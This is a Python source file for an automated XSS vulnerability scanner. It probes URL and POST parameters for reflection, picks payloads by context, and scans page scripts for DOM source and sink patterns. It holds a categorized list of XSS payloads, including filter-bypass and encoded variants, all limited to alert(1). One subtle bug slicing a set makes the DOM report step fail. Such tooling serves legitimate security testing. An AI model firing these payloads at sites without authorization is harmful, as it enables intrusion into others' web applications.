"""
XSS Scanner - Detection des vulnerabilites Cross-Site Scripting.
Supporte: Reflected XSS, Stored XSS detection, DOM-based hints.
"""

import re
import time
import random
import string
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings()
console = Console()

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)


def _random_tag():
    """Generate a unique random marker for reflection detection."""
    return "xss" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


# XSS Payloads organized by context
XSS_PAYLOADS = {
    "basic": [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
    ],
    "attribute_escape": [
        '" autofocus onfocus="alert(1)',
        "' autofocus onfocus='alert(1)",
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
    ],
    "javascript_context": [
        "';alert(1)//",
        '";alert(1)//',
        "'-alert(1)-'",
        '"-alert(1)-"',
        "\\';alert(1)//",
    ],
    "tag_bypass": [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src="x" onerror="alert(1)">',
        '<body onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
    ],
    "encoding_bypass": [
        '<script>alert(String.fromCharCode(49))</script>',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
    ],
    "dom_based": [
        '#<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
    ],
}

# Patterns indicating DOM-based XSS sinks
DOM_SINKS = [
    r'document\.write\s*\(',
    r'document\.writeln\s*\(',
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'\.insertAdjacentHTML\s*\(',
    r'eval\s*\(',
    r'setTimeout\s*\([^,]*["\']',
    r'setInterval\s*\([^,]*["\']',
    r'location\s*=',
    r'location\.href\s*=',
    r'location\.replace\s*\(',
    r'location\.assign\s*\(',
    r'window\.open\s*\(',
]

# Patterns indicating DOM sources
DOM_SOURCES = [
    r'location\.hash',
    r'location\.search',
    r'location\.href',
    r'document\.URL',
    r'document\.documentURI',
    r'document\.referrer',
    r'window\.name',
    r'document\.cookie',
    r'localStorage\.',
    r'sessionStorage\.',
]


class XSSScanner:
    """Scan for Cross-Site Scripting vulnerabilities."""

    def __init__(self, session=None, delay=0.5):
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        self.session.verify = False
        self.delay = delay
        self.results = []

    def scan_url(self, url, method="GET", data=None, params_to_test=None):
        """
        Scan a URL for XSS.

        Returns:
            list of vulnerability findings
        """
        self.results = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        console.print(f"\n  [bold cyan]XSS Scan:[/bold cyan] {url[:80]}")
        console.print(f"  [dim]Methode: {method} | Params: {list(query_params.keys())}[/dim]")

        # Phase 1: Reflection detection
        console.print("\n  [bold]Phase 1: Detection de reflexion[/bold]")
        reflectable = self._find_reflections(url, parsed, query_params, method, data)

        if not reflectable:
            console.print("  [yellow]Aucune reflexion detectee dans les parametres[/yellow]")
        else:
            console.print(f"  [green]Reflexions trouvees: {', '.join(reflectable)}[/green]")

            # Phase 2: XSS payload testing on reflected params
            console.print("\n  [bold]Phase 2: Test des payloads XSS[/bold]")
            for param in reflectable:
                if params_to_test and param not in params_to_test:
                    continue
                self._test_xss_payloads(url, parsed, query_params, param, method, data)

        # Phase 3: DOM-based XSS analysis
        console.print("\n  [bold]Phase 3: Analyse DOM-based XSS[/bold]")
        self._check_dom_xss(url, method, data)

        return self.results

    def _find_reflections(self, url, parsed, query_params, method, data):
        """Check which parameters are reflected in the response."""
        reflectable = []

        for param_name, values in query_params.items():
            marker = _random_tag()
            modified = dict(query_params)
            modified[param_name] = [marker]
            new_query = urlencode(modified, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                resp = self.session.get(test_url, timeout=15, allow_redirects=True)
                if marker in resp.text:
                    reflectable.append(param_name)
                    console.print(f"    [green]Reflexion:[/green] {param_name}")
                else:
                    console.print(f"    [dim]Pas de reflexion: {param_name}[/dim]")
                time.sleep(self.delay)
            except Exception as e:
                console.print(f"    [yellow]Erreur: {param_name}: {e}[/yellow]")

        # Check POST params if applicable
        if method.upper() == "POST" and data:
            if isinstance(data, str):
                post_params = parse_qs(data, keep_blank_values=True)
            elif isinstance(data, dict):
                post_params = {k: [v] if not isinstance(v, list) else v for k, v in data.items()}
            else:
                post_params = {}

            for param_name in post_params:
                marker = _random_tag()
                modified = {k: v[0] if isinstance(v, list) else v for k, v in post_params.items()}
                modified[param_name] = marker

                try:
                    resp = self.session.post(url, data=modified, timeout=15, allow_redirects=True)
                    if marker in resp.text:
                        reflectable.append(param_name)
                        console.print(f"    [green]Reflexion (POST):[/green] {param_name}")
                    time.sleep(self.delay)
                except Exception:
                    pass

        return reflectable

    def _test_xss_payloads(self, url, parsed, query_params, param_name, method, data):
        """Test XSS payloads on a reflected parameter."""
        console.print(f"\n    [bold]Param: {param_name}[/bold]")

        # First, determine the reflection context
        context = self._detect_context(url, parsed, query_params, param_name)
        console.print(f"    [dim]Contexte: {context}[/dim]")

        # Select payloads based on context
        payload_categories = ["basic"]
        if context == "attribute":
            payload_categories = ["attribute_escape", "basic"]
        elif context == "javascript":
            payload_categories = ["javascript_context", "basic"]
        elif context == "html":
            payload_categories = ["basic", "tag_bypass"]

        tested = 0
        for category in payload_categories:
            for payload in XSS_PAYLOADS.get(category, []):
                modified = dict(query_params)
                modified[param_name] = [payload]
                new_query = urlencode(modified, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

                try:
                    resp = self.session.get(test_url, timeout=15, allow_redirects=True)
                    reflected, vuln_type = self._check_payload_reflected(payload, resp.text)

                    if reflected:
                        confidence = "HIGH" if vuln_type == "unfiltered" else "MEDIUM"
                        console.print(f"    [bold red]VULNERABLE[/bold red] [{confidence}] {category}: {payload[:50]}")
                        console.print(f"      [dim]Type: {vuln_type}[/dim]")
                        self.results.append({
                            "param": param_name,
                            "type": "reflected_xss",
                            "category": category,
                            "payload": payload,
                            "confidence": confidence,
                            "vuln_type": vuln_type,
                            "context": context,
                            "url": test_url[:300],
                        })
                    else:
                        console.print(f"    [dim]Filtre: {category}: {payload[:40]}[/dim]")

                    tested += 1
                    time.sleep(self.delay)
                except Exception:
                    pass

                # Stop after finding first high-confidence vuln per param
                if any(r["confidence"] == "HIGH" and r["param"] == param_name for r in self.results):
                    console.print(f"    [green]Vuln HIGH confirmee, passage au param suivant[/green]")
                    return

        console.print(f"    [dim]{tested} payloads testes[/dim]")

    def _detect_context(self, url, parsed, query_params, param_name):
        """Detect where the parameter is reflected: html, attribute, javascript, etc."""
        marker = _random_tag()
        modified = dict(query_params)
        modified[param_name] = [marker]
        new_query = urlencode(modified, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            resp = self.session.get(test_url, timeout=15, allow_redirects=True)
            body = resp.text

            if marker not in body:
                return "none"

            # Check if inside <script> tag
            idx = body.index(marker)
            before = body[max(0, idx - 500):idx].lower()
            if "<script" in before and "</script>" not in before[before.rfind("<script"):]:
                return "javascript"

            # Check if inside an HTML attribute
            # Look for patterns like: value="MARKER" or src='MARKER'
            attr_pattern = re.compile(r'[\w-]+\s*=\s*["\'][^"\']*' + re.escape(marker))
            if attr_pattern.search(body):
                return "attribute"

            # Check if inside HTML comment
            comment_before = before.rfind("<!--")
            comment_end = before.rfind("-->")
            if comment_before > comment_end:
                return "comment"

            return "html"
        except Exception:
            return "unknown"

    def _check_payload_reflected(self, payload, response_body):
        """Check if an XSS payload is reflected without filtering."""
        # Exact match = unfiltered
        if payload in response_body:
            return True, "unfiltered"

        # Check for partial reflection (some chars filtered)
        # Strip the outer quotes/brackets and check core payload
        core_patterns = [
            "alert(1)",
            "onerror=alert(1)",
            "onload=alert(1)",
            "onfocus=alert(1)",
        ]
        for pattern in core_patterns:
            if pattern in payload and pattern in response_body:
                return True, "partial_filter"

        # Check if HTML entities were decoded
        soup = BeautifulSoup(response_body, "html.parser")
        # Look for script/event handler injection in parsed DOM
        dangerous_attrs = ["onerror", "onload", "onfocus", "onmouseover", "onclick", "ontoggle", "onstart"]
        for tag in soup.find_all(True):
            for attr in dangerous_attrs:
                if tag.get(attr) and "alert" in str(tag.get(attr)):
                    return True, "dom_injection"

        return False, None

    def _check_dom_xss(self, url, method, data):
        """Analyze page JavaScript for DOM-based XSS patterns."""
        try:
            resp = self.session.get(url, timeout=15, allow_redirects=True)
            body = resp.text

            findings = []

            # Find sources
            found_sources = []
            for pattern in DOM_SOURCES:
                matches = re.findall(pattern, body)
                if matches:
                    found_sources.extend(matches)

            # Find sinks
            found_sinks = []
            for pattern in DOM_SINKS:
                matches = re.findall(pattern, body)
                if matches:
                    found_sinks.extend(matches)

            if found_sources and found_sinks:
                console.print(f"    [bold yellow]DOM-XSS potentiel[/bold yellow]")
                console.print(f"      Sources: {', '.join(set(found_sources)[:5])}")
                console.print(f"      Sinks: {', '.join(set(found_sinks)[:5])}")
                self.results.append({
                    "param": "DOM",
                    "type": "dom_xss",
                    "category": "dom_based",
                    "payload": "N/A",
                    "confidence": "LOW",
                    "vuln_type": "potential_dom_xss",
                    "context": "javascript",
                    "sources": list(set(found_sources)),
                    "sinks": list(set(found_sinks)),
                    "url": url[:300],
                })
            elif found_sinks:
                console.print(f"    [dim]Sinks trouves mais pas de source directe: {', '.join(set(found_sinks)[:3])}[/dim]")
            else:
                console.print(f"    [dim]Pas de pattern DOM-XSS dangereux detecte[/dim]")

        except Exception as e:
            console.print(f"    [yellow]Erreur DOM analysis: {e}[/yellow]")

    def get_results_summary(self):
        """Return a summary of findings."""
        if not self.results:
            return None
        return {
            "total_findings": len(self.results),
            "high_confidence": len([r for r in self.results if r["confidence"] == "HIGH"]),
            "medium_confidence": len([r for r in self.results if r["confidence"] == "MEDIUM"]),
            "types": list(set(r["type"] for r in self.results)),
            "params": list(set(r["param"] for r in self.results)),
            "details": self.results,
        }
